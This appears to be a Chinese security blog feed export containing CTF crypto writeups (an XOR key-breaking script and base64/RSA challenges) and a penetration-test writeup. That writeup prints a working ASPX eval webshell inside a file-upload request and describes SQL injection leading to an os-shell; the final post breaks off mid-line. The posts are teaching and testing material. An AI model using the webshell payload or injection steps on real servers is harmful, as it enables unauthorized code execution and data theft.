<p>salt key 都是循环利用的</p>
<p>salt是已知的 所以先将salt层 异或去掉  得到 si</p>
<p>c ^ si = p ^ ki </p>
<p>c 和 si是 已知的  所以可以求出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="string">&#x27;49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c&#x27;</span></span><br><span class="line">salt = <span class="string">&quot;WeAreDe1taTeam&quot;</span></span><br><span class="line">si2 = cycle(salt)</span><br><span class="line">nosalt = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(c)/<span class="number">2</span>)):</span><br><span class="line">    temp = c[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>]</span><br><span class="line">    <span class="comment"># print(binascii.a2b_hex(temp))</span></span><br><span class="line">    temphex_int = <span class="built_in">ord</span>(binascii.a2b_hex(temp).decode())</span><br><span class="line">    <span class="comment"># p = chr(temphex_int ^ ord(next(si2)) ^ ord(next(ki2)))</span></span><br><span class="line">    temp_re = <span class="built_in">hex</span>(temphex_int ^ <span class="built_in">ord</span>(<span class="built_in">next</span>(si2)))[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">    nosalt = nosalt + temp_re</span><br></pre></td></tr></table></figure>



<h4 id="猜解密钥长度"><a href="#猜解密钥长度" class="headerlink" title="猜解密钥长度"></a>猜解密钥长度</h4><p>key长度小于38 其中已知位数8位  所以未知位数小于30</p>
<p>可以使用汉明距离 去猜解密钥长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hamming(&quot;1010&quot;, &quot;1111&quot;) == 2</span><br><span class="line">hamming(&quot;1111&quot;, &quot;0000&quot;) == 4</span><br><span class="line">hamming(&quot;1111&quot;, &quot;1111&quot;) == 0</span><br></pre></td></tr></table></figure>

<p>汉明距离 与 密钥长度猜解之间的联系：</p>
<p>两个以 Ascii编码的英文字符 之间的汉明距离是 2<del>3  所以正常英文字母的评价汉明距离为 2</del>3 【每比特】，任意字符（非纯字母）的两两汉明距离 平均为4。</p>
<blockquote>
<p>大写字母A-Z  ascii  65-90        65对应二进制 01000001  90对应二进制 01011010 </p>
<p>小写字母a-z   ascii  97-122        </p>
<p>65对应二进制 01000001  </p>
<p>90对应二进制 01011010   字母汉明距离平均为2-3</p>
</blockquote>
<p>正确分组的密文与密文直接的汉明距离 等于明文与明文之间的汉明距离【通过按正确密钥长度分组的密文与密文异或等于明文与明文异或证明】</p>
<p>所以 当使用正确的密钥长度后，两两字母进行计算汉明距离，这个值会趋于最小。</p>
<h4 id="密文解密"><a href="#密文解密" class="headerlink" title="密文解密"></a>密文解密</h4><p>1.异或加密中  使用相同密钥加密的明文和密文加存在这个规律：  密文和密文异或 等于 明文和明文异或。</p>
<p>2.空格和所有小写字母异或的结果是对应的大写字母； 空格和所有大写字母 异或的结果是对应的小写字母。除空格外，有些组合可出现异或结果是大小写字母，但是空格出现时，结果在大小写字母间的概率最大。</p>
<p>3.两个以ascii编码的英文字符的汉明距离是2-3之间，也就是说正常英文字母的平均汉明距离为2-3（每比特），任意字符（非纯字母）的两两汉明距离平均为4。</p>
<p>4.在破解这类问题的三步走：猜解密钥长度；根据密钥长度分组，依次求解密钥每个字节得出密钥；最后根据密钥还原出明文。</p>
<p>直接用文章的脚本 <a href="https://www.anquanke.com/post/id/161171#h2-0">https://www.anquanke.com/post/id/161171#h2-0</a>  当然题目和这个是不一样的 但是去盐后就是同一类题目</p>
<p> 后面稍加变动即可 学习下这种思路</p>
<h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bxor</span>(<span class="params">a, b</span>):     <span class="comment"># xor two byte strings of different lengths</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a) &gt; <span class="built_in">len</span>(b):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a[:<span class="built_in">len</span>(b)], b)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b[:<span class="built_in">len</span>(a)])])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hamming_distance</span>(<span class="params">b1, b2</span>):</span><br><span class="line">    differing_bits = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> bxor(b1, b2):</span><br><span class="line">        differing_bits += <span class="built_in">bin</span>(byte).count(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> differing_bits</span><br><span class="line"></span><br><span class="line"><span class="comment"># text = &#x27;&#x27;</span></span><br><span class="line"><span class="comment"># with open(&quot;6.txt&quot;,&quot;r&quot;) as f:</span></span><br><span class="line"><span class="comment">#     for line in f:</span></span><br><span class="line"><span class="comment">#         text += line</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b = base64.b64decode(text)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">break_single_key_xor</span>(<span class="params">text</span>):</span><br><span class="line">    key = <span class="number">0</span></span><br><span class="line">    possible_space=<span class="number">0</span></span><br><span class="line">    max_possible=<span class="number">0</span></span><br><span class="line">    letters = string.ascii_letters.encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(text)):</span><br><span class="line">        maxpossible = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(text)):</span><br><span class="line">            <span class="keyword">if</span>(a == b):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            c = text[a] ^ text[b]</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> letters <span class="keyword">and</span> c != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            maxpossible += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> maxpossible&gt;max_possible:</span><br><span class="line">            max_possible=maxpossible</span><br><span class="line">            possible_space=a</span><br><span class="line">    key = text[possible_space]^ <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c=<span class="string">&#x27;49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c&#x27;</span></span><br><span class="line">salt=<span class="string">&quot;WeAreDe1taTeam&quot;</span></span><br><span class="line">si2=cycle(salt)</span><br><span class="line">nosalt=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(c)/<span class="number">2</span>)):</span><br><span class="line">    temp=c[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>]</span><br><span class="line">    <span class="comment"># print(binascii.a2b_hex(temp))</span></span><br><span class="line">    temphex_int=<span class="built_in">ord</span>(binascii.a2b_hex(temp).decode())</span><br><span class="line">    <span class="comment"># p = chr(temphex_int ^ ord(next(si2)) ^ ord(next(ki2)))</span></span><br><span class="line">    temp_re= <span class="built_in">hex</span>(temphex_int ^ <span class="built_in">ord</span>(<span class="built_in">next</span>(si2)))[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">    nosalt=nosalt+temp_re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b=binascii.a2b_hex(nosalt)</span><br><span class="line"></span><br><span class="line">normalized_distances = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">40</span>):</span><br><span class="line">    <span class="comment">#我们取其中前6段计算平局汉明距离</span></span><br><span class="line">    b1 = b[: KEYSIZE]</span><br><span class="line">    b2 = b[KEYSIZE: KEYSIZE * <span class="number">2</span>]</span><br><span class="line">    b3 = b[KEYSIZE * <span class="number">2</span>: KEYSIZE * <span class="number">3</span>]</span><br><span class="line">    b4 = b[KEYSIZE * <span class="number">3</span>: KEYSIZE * <span class="number">4</span>]</span><br><span class="line">    b5 = b[KEYSIZE * <span class="number">4</span>: KEYSIZE * <span class="number">5</span>]</span><br><span class="line">    b6 = b[KEYSIZE * <span class="number">5</span>: KEYSIZE * <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">    normalized_distance = <span class="built_in">float</span>(</span><br><span class="line">        hamming_distance(b1, b2) +</span><br><span class="line">        hamming_distance(b2, b3) +</span><br><span class="line">        hamming_distance(b3, b4) +</span><br><span class="line">        hamming_distance(b4, b5) +</span><br><span class="line">        hamming_distance(b5, b6)</span><br><span class="line">    ) / (KEYSIZE * <span class="number">5</span>)</span><br><span class="line">    normalized_distances.append(</span><br><span class="line">        (KEYSIZE, normalized_distance)</span><br><span class="line">    )</span><br><span class="line">normalized_distances = <span class="built_in">sorted</span>(normalized_distances,key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE,_ <span class="keyword">in</span> normalized_distances[:<span class="number">5</span>]:</span><br><span class="line">    block_bytes = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(KEYSIZE)]</span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(b):</span><br><span class="line">        block_bytes[i % KEYSIZE].append(byte)</span><br><span class="line">    keys = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> bbytes <span class="keyword">in</span> block_bytes:</span><br><span class="line">            keys += break_single_key_xor(bbytes)</span><br><span class="line">        key = <span class="built_in">bytearray</span>(keys * <span class="built_in">len</span>(b), <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        plaintext = bxor(b, key)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;keysize:&quot;</span>, KEYSIZE)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;key is:&quot;</span>, keys, <span class="string">&quot;n&quot;</span>)</span><br><span class="line">        s = <span class="built_in">bytes</span>.decode(plaintext)</span><br><span class="line">        <span class="built_in">print</span>(s)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://fitzbc.github.io/2019/08/04/De1CTF-xorz-Writeup/">https://fitzbc.github.io/2019/08/04/De1CTF-xorz-Writeup/</a></p>
<p><a href="https://www.anquanke.com/post/id/161171#h2-0">https://www.anquanke.com/post/id/161171#h2-0</a> </p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>从文件泄露代码审计到Getshell</title>
    <url>/posts/34084a97/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>某次项目中客户要求在互联网侧进行渗透测试，奈何肝了两天也没找到个高危漏洞，没办法太菜了。</p>
<p>偶然间端口扫描后，扫目录发现了两个bin.rar，这下和客户有得交代了！！！</p>
<p><img src="/posts/34084a97/1.png" alt="image-20240222171901823"></p>
<p>解压后为多个dll文件，使用ILspy进行反编译Android.dll</p>
<p><img src="/posts/34084a97/2.png" alt="image-20240222171920337"></p>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>开始 .net代码审计</p>
<p><img src="/posts/34084a97/3.png" alt="截图"></p>
<p><img src="/posts/34084a97/4.png" alt="image-20240222171947564"></p>
<h3 id="日志泄露"><a href="#日志泄露" class="headerlink" title="日志泄露"></a>日志泄露</h3><p>代码审计后发现存在一个 log.txt 日志泄露  记录着请求日志</p>
<p><img src="/posts/34084a97/5.png" alt="image-20240222171959681"></p>
<p><img src="/posts/34084a97/6.png" alt="image-20240222172017042"></p>
<h3 id="未授权文件上传服务"><a href="#未授权文件上传服务" class="headerlink" title="未授权文件上传服务"></a>未授权文件上传服务</h3><p><img src="/posts/34084a97/7.png" alt="image-20240222172109037"></p>
<p>访问 <a href="http://xx.xx.xx.xx/UploadByFile.aspx">http://xx.xx.xx.xx/UploadByFile.aspx</a>  通过读源码已经给出了上传密码lk，输入密码后可以上传到人员指定目录下</p>
<p> <img src="/posts/34084a97/8.png" alt="image-20240222172122212"></p>
<h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><p><img src="/posts/34084a97/9.png" alt="image-20240222172142497"></p>
<p>构造文件上传数据包进行fuzz  会上传到/UpPhoto 目录下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /UploadAndroid.aspx HTTP/1.1</span><br><span class="line">Host: xx.xx.xx.xx:8500</span><br><span class="line">Content-Length: 345</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: null</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGxb4OzDF9eaemiFU</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh,zh-CN;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryGxb4OzDF9eaemiFU</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;1.aspx&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br><span class="line">------WebKitFormBoundaryGxb4OzDF9eaemiFU</span><br></pre></td></tr></table></figure>

<p><img src="/posts/34084a97/10.png" alt="image-20240222172158143"></p>
<p>上传成功连接蚁剑 getshell</p>
<p><img src="/posts/34084a97/11.png" alt="image-20240222172210227"></p>
<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>两个泄露的dll中都存在很多sql注入，没有进行过滤处理，推测这两个端口服务均为API接口</p>
<p><img src="/posts/34084a97/12.png" alt="image-20240222172224240"></p>
<p>此处 strYear 未经过处理 存在sql注入  <a href="http://xx.xx.xx.xx:85/GetInfoxxxx.aspx?year=2">http://xx.xx.xx.xx:85/GetInfoxxxx.aspx?year=2</a></p>
<p>还存在其他多处注入点</p>
<p><img src="/posts/34084a97/13.png" alt="image-20240222172236311"></p>
<p><img src="/posts/34084a97/14.png" alt="image-20240222172248521"></p>
<hr>
<p>在另一处端口代码泄露中也存在多处sql注入 未经过处理的地方很多就不在列举。。。基本上strXX、XXID、year、data都可以注入</p>
<p><img src="/posts/34084a97/15.png" alt="image-20240222172300435"></p>
<p><img src="/posts/34084a97/16.png" alt="image-20240222172313086"></p>
<p><a href="http://xx.xx.xx.xx/XXXX/XXXX/GetFileReviewEdit.aspx?strFWID=1">http://xx.xx.xx.xx:80/XXXX/XXXX/GetFileReviewEdit.aspx?strFWID=1</a></p>
<p><a href="http://xx.xx.xx.xx/XXXX/XXXX/GetFileReviewList.aspx?strName=1">http://xx.xx.xx.xx:80/XXXX/XXXX/GetFileReviewList.aspx?strName=1</a></p>
<p><img src="/posts/34084a97/17.png" alt="image-20240222172322699"></p>
<p><img src="/posts/34084a97/18.png" alt="image-20240222172333809"></p>
<p>sqlmap可以直接注入获取数据并os-shell</p>
<p><img src="/posts/34084a97/19.png" alt="image-20240222172347493"></p>
<p>除了以上之外 也有多处敏感信息泄露，这里便不再列举。。</p>
]]></content>
  </entry>
  <entry>
    <title>NSS Crypto-03</title>
    <url>/posts/555436f5/</url>
    <content><![CDATA[<h3 id="这是base"><a href="#这是base" class="headerlink" title="这是base??"></a>这是base??</h3><p>题目</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict:&#123;0: &#x27;J&#x27;, 1: &#x27;K&#x27;, 2: &#x27;L&#x27;, 3: &#x27;M&#x27;, 4: &#x27;N&#x27;, 5: &#x27;O&#x27;, 6: &#x27;x&#x27;, 7: &#x27;y&#x27;, 8: &#x27;U&#x27;, 9: &#x27;V&#x27;, 10: &#x27;z&#x27;, 11: &#x27;A&#x27;, 12: &#x27;B&#x27;, 13: &#x27;C&#x27;, 14: &#x27;D&#x27;, 15: &#x27;E&#x27;, 16: &#x27;F&#x27;, 17: &#x27;G&#x27;, 18: &#x27;H&#x27;, 19: &#x27;7&#x27;, 20: &#x27;8&#x27;, 21: &#x27;9&#x27;, 22: &#x27;P&#x27;, 23: &#x27;Q&#x27;, 24: &#x27;I&#x27;, 25: &#x27;a&#x27;, 26: &#x27;b&#x27;, 27: &#x27;c&#x27;, 28: &#x27;d&#x27;, 29: &#x27;e&#x27;, 30: &#x27;f&#x27;, 31: &#x27;g&#x27;, 32: &#x27;h&#x27;, 33: &#x27;i&#x27;, 34: &#x27;j&#x27;, 35: &#x27;k&#x27;, 36: &#x27;l&#x27;, 37: &#x27;m&#x27;, 38: &#x27;W&#x27;, 39: &#x27;X&#x27;, 40: &#x27;Y&#x27;, 41: &#x27;Z&#x27;, 42: &#x27;0&#x27;, 43: &#x27;1&#x27;, 44: &#x27;2&#x27;, 45: &#x27;3&#x27;, 46: &#x27;4&#x27;, 47: &#x27;5&#x27;, 48: &#x27;6&#x27;, 49: &#x27;R&#x27;, 50: &#x27;S&#x27;, 51: &#x27;T&#x27;, 52: &#x27;n&#x27;, 53: &#x27;o&#x27;, 54: &#x27;p&#x27;, 55: &#x27;q&#x27;, 56: &#x27;r&#x27;, 57: &#x27;s&#x27;, 58: &#x27;t&#x27;, 59: &#x27;u&#x27;, 60: &#x27;v&#x27;, 61: &#x27;w&#x27;, 62: &#x27;+&#x27;, 63: &#x27;/&#x27;, 64: &#x27;=&#x27;&#125;</span><br><span class="line"></span><br><span class="line">chipertext:</span><br><span class="line">FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分析</p>
<p>刚开始以为是python字典 然后把这个进行替换 让ai去解密 但是不行</p>
<p>然后提取出 字典所有值，放到CyberChef中 base64替换 解密即可  BJD{D0_Y0u_kNoW_Th1s_b4se_map}</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">base64_dict = &#123;</span><br><span class="line">    <span class="number">0</span>: <span class="string">&#x27;J&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;K&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;L&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;M&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;N&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;O&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;x&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;y&#x27;</span>, <span class="number">8</span>: <span class="string">&#x27;U&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">    <span class="number">10</span>: <span class="string">&#x27;z&#x27;</span>, <span class="number">11</span>: <span class="string">&#x27;A&#x27;</span>, <span class="number">12</span>: <span class="string">&#x27;B&#x27;</span>, <span class="number">13</span>: <span class="string">&#x27;C&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;D&#x27;</span>, <span class="number">15</span>: <span class="string">&#x27;E&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;F&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;G&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;H&#x27;</span>,</span><br><span class="line">    <span class="number">19</span>: <span class="string">&#x27;7&#x27;</span>, <span class="number">20</span>: <span class="string">&#x27;8&#x27;</span>, <span class="number">21</span>: <span class="string">&#x27;9&#x27;</span>, <span class="number">22</span>: <span class="string">&#x27;P&#x27;</span>, <span class="number">23</span>: <span class="string">&#x27;Q&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;I&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;b&#x27;</span>, <span class="number">27</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="number">28</span>: <span class="string">&#x27;d&#x27;</span>, <span class="number">29</span>: <span class="string">&#x27;e&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;f&#x27;</span>, <span class="number">31</span>: <span class="string">&#x27;g&#x27;</span>, <span class="number">32</span>: <span class="string">&#x27;h&#x27;</span>, <span class="number">33</span>: <span class="string">&#x27;i&#x27;</span>, <span class="number">34</span>: <span class="string">&#x27;j&#x27;</span>, <span class="number">35</span>: <span class="string">&#x27;k&#x27;</span>, <span class="number">36</span>: <span class="string">&#x27;l&#x27;</span>,</span><br><span class="line">    <span class="number">37</span>: <span class="string">&#x27;m&#x27;</span>, <span class="number">38</span>: <span class="string">&#x27;W&#x27;</span>, <span class="number">39</span>: <span class="string">&#x27;X&#x27;</span>, <span class="number">40</span>: <span class="string">&#x27;Y&#x27;</span>, <span class="number">41</span>: <span class="string">&#x27;Z&#x27;</span>, <span class="number">42</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">43</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;2&#x27;</span>, <span class="number">45</span>: <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">    <span class="number">46</span>: <span class="string">&#x27;4&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;5&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;6&#x27;</span>, <span class="number">49</span>: <span class="string">&#x27;R&#x27;</span>, <span class="number">50</span>: <span class="string">&#x27;S&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;T&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;n&#x27;</span>, <span class="number">53</span>: <span class="string">&#x27;o&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">    <span class="number">55</span>: <span class="string">&#x27;q&#x27;</span>, <span class="number">56</span>: <span class="string">&#x27;r&#x27;</span>, <span class="number">57</span>: <span class="string">&#x27;s&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;t&#x27;</span>, <span class="number">59</span>: <span class="string">&#x27;u&#x27;</span>, <span class="number">60</span>: <span class="string">&#x27;v&#x27;</span>, <span class="number">61</span>: <span class="string">&#x27;w&#x27;</span>, <span class="number">62</span>: <span class="string">&#x27;+&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="number">64</span>: <span class="string">&#x27;=&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">all_values_str = <span class="string">&#x27;&#x27;</span>.join(base64_dict.values())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(all_values_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># JKLMNOxyUVzABCDEFGH789PQIabcdefghijklmWXYZ0123456RSTnopqrstuvw+/=</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/555436f5/1.png"></p>
<h3 id="NSSCTF-2022-Spring-Recruit-rrrsssaaa"><a href="#NSSCTF-2022-Spring-Recruit-rrrsssaaa" class="headerlink" title="[NSSCTF 2022 Spring Recruit]rrrsssaaa"></a>[NSSCTF 2022 Spring Recruit]rrrsssaaa</h3><p>题目</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = p * <span class="number">5</span> + i</span><br><span class="line">    <span class="keyword">if</span> isPrime(r):</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    q = p * <span class="number">10</span> + i</span><br><span class="line">    <span class="keyword">if</span> isPrime(q):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">n = p * q * r</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag.encode()), e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p3=&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">pow</span>(p, <span class="number">3</span>, n)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q3=&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">pow</span>(q, <span class="number">3</span>, n)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;r3=&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">pow</span>(r, <span class="number">3</span>, n)))</span><br><span class="line"><span class="comment"># n = 44571911854174527304485400947383944661319242813524818888269963870884859557542264803774212076803157466539443358890313286282067621989609252352994203884813364011659788234277369629312571477760818634118449563652776213438461157699447304292906151410018017960605868035069246651843561595572415595568705784173761441087845248621463389786351743200696279604003824362262237505386409700329605140703782099240992158439201646344692107831931849079888757310523663310273856448713786678014221779214444879454790399990056124051739535141631564534546955444505648933134838799753362350266884682987713823886338789502396879543498267617432600351655901149380496067582237899323865338094444822339890783781705936546257971766978222763417870606459677496796373799679580683317833001077683871698246143179166277232084089913202832193540581401453311842960318036078745448783370048914350299341586452159634173821890439194014264891549345881324015485910286021846721593668473</span></span><br><span class="line"><span class="comment"># c = 